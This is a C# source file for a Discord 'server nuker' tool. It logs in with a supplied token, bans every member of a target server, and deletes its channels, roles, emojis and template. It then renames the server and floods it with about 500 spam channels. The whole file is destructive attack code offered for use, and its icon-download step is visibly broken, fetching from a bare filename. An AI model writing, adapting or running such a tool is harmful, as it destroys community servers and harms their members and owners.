using Discord;
using Discord.Gateway;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Threading;

namespace Server_Nuker
{
  internal class Program
  {
    public static void Main()
    {
      DiscordSocketClient client = new DiscordSocketClient();
      Console.Write("Token : ");
      client.Login(Console.ReadLine());
      Console.Write("Server ID : ");
      ulong uint64 = Convert.ToUInt64(Console.ReadLine());
      DiscordGuild guild1 = client.GetGuild(uint64);
      SocketGuild cachedGuild = client.GetCachedGuild(uint64);
      MinimalGuild guild2 = (MinimalGuild) client.GetGuild(uint64);
      Console.WriteLine("Banning everyone");
      foreach (GuildMember member in (IEnumerable<GuildMember>) cachedGuild.GetMembers())
      {
        if ((long) member.User.Id != (long) client.User.Id)
        {
          try
          {
            member.Ban();
            Console.WriteLine("Banned " + member.User.ToString());
          }
          catch (Exception ex)
          {
            Console.WriteLine(ex.Message);
          }
        }
      }
      Console.WriteLine("Deleting template");
      IReadOnlyList<DiscordGuildTemplate> templates = guild1.GetTemplates();
      if (templates.Any<DiscordGuildTemplate>())
      {
        string code = templates.First<DiscordGuildTemplate>().Code;
        guild1.DeleteTemplate(code);
      }
      Console.WriteLine("Deleting channels");
      foreach (GuildChannel channel in (IEnumerable<GuildChannel>) guild1.GetChannels())
      {
        try
        {
          channel.Delete();
          Console.WriteLine("Deleted " + channel.Name);
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex.Message);
        }
      }
      Console.WriteLine("Deleting roles");
      foreach (DiscordRole role in (IEnumerable<DiscordRole>) guild1.GetRoles())
      {
        if ((long) role.Id != (long) uint64)
        {
          try
          {
            role.Delete();
            Console.WriteLine("Deleted " + role.Name);
          }
          catch (Exception ex)
          {
            Console.WriteLine(ex.Message);
          }
        }
      }
      Console.WriteLine("Deleting emojis");
      foreach (DiscordEmoji emoji in (IEnumerable<DiscordEmoji>) guild1.Emojis)
        emoji.Delete();
      Console.WriteLine("Changing icon");
      if (!System.IO.File.Exists("minw.jpg"))
      {
        using (WebClient webClient = new WebClient())
          webClient.DownloadFile("minw.jpg", "minw.jpg");
      }
      try
      {
        guild1.Modify(new GuildProperties()
        {
          Icon = (DiscordImage) Image.FromFile("mb.png")
        });
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
      Console.WriteLine("Changing name");
      try
      {
        guild1.Modify(new GuildProperties()
        {
          Name = "2kartier block"
        });
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
      Console.WriteLine("Creating channels");
      for (int index = 1; index < 500; ++index)
      {
        try
        {
          guild1.CreateChannel("iluv 2kartier", ChannelType.Text);
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex.Message);
        }
      }
      Console.WriteLine("Done!");
      Thread.Sleep(-1);
    }
  }
}
